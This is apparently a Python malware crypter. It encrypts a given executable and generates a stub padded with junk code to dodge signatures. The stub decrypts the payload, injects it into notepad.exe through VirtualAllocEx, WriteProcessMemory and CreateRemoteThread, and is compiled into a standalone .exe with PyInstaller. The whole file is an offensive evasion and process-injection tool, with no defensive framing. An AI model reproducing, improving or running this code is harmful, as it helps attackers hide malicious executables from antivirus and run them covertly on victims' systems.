from cryptography.fernet import Fernet
import subprocess
import os
import shutil
import sys
import base64

input_file = sys.argv[1]
input_filename_w_extention = os.path.basename(input_file)
# remove the .exe extension
input_filename = input_filename_w_extention[:-4]
output_filename = input_filename
output_path = os.getcwd()

# Encrypt the software
key = Fernet.generate_key()
cipher = Fernet(key)
with open(input_file, "rb") as f:
    payload = f.read()
    encrypted_payload = cipher.encrypt(payload)


# decryptor code
STUB = f"""
import psutil as _pu
import subprocess as _sp
from cryptography.fernet import Fernet as _Fe
from ctypes import *
import ctypes as _ct

# Junk code
_a = 1 + 2
_b = _a * 3
_j = "This is a junk string."
vzclt = 8
lkgcy = 4
qnios = 9
xuflm = 5
hziwy = 2

_ky = {key!r}
_f = _Fe(_ky)
_pl_sz = {len(payload)}
_enc_pl = {encrypted_payload}

# Junk code
_c = "Another junk string."

# Find the process to inject the payload into
_pr_nm = "notepad.exe"
for _prc in _pu.process_iter():
    if _prc.name() == _pr_nm:
        _tgt_pr = _prc
        break
else:
    # If the process is not running, create a new instance
    _tgt_pr = _sp.Popen(_pr_nm)

# Decrypt the payload in the current process
_dec_pl = _f.decrypt(_enc_pl)

# Allocate memory in the target process to store the decrypted payload
_dec_pl_adr = windll.kernel32.VirtualAllocEx(_tgt_pr.handle, None, len(_dec_pl), 0x3000, 0x04)

# Junk code
_d = _b - _a
hziwy + lkgcy
lkgcy * vzclt
qnios - xuflm
xuflm // lkgcy
hziwy * vzclt
qnios + xuflm


# Write the decrypted payload to the allocated memory
windll.kernel32.WriteProcessMemory(_tgt_pr.handle, _dec_pl_adr, _dec_pl, len(_dec_pl), None)

# Execute the decrypted payload
_ct.windll.kernel32.VirtualProtectEx(_tgt_pr.handle, _dec_pl_adr, len(_dec_pl), 0x40, byref(c_ulong()))
_ct.windll.kernel32.CreateRemoteThread(_tgt_pr.handle, None, 0, _dec_pl_adr, None, 0, None)
"""

decryptor_script_path = f"{output_path}\GEN_{output_filename}.pyw"

with open(decryptor_script_path, "w") as f:
    f.write(STUB)


# Compile the decryptor code into an executable
subprocess.call(["pyinstaller", "--onefile", decryptor_script_path])

# Remove unnecessary files/folders generated by pyinstaller
os.remove(f'GEN_{input_filename}.spec')
shutil.rmtree('build')
shutil.move(f'{output_path}\dist\GEN_{input_filename}.exe',
            f'{output_path}\GEN_{output_filename}.exe')
shutil.rmtree('dist')
os.remove(decryptor_script_path)
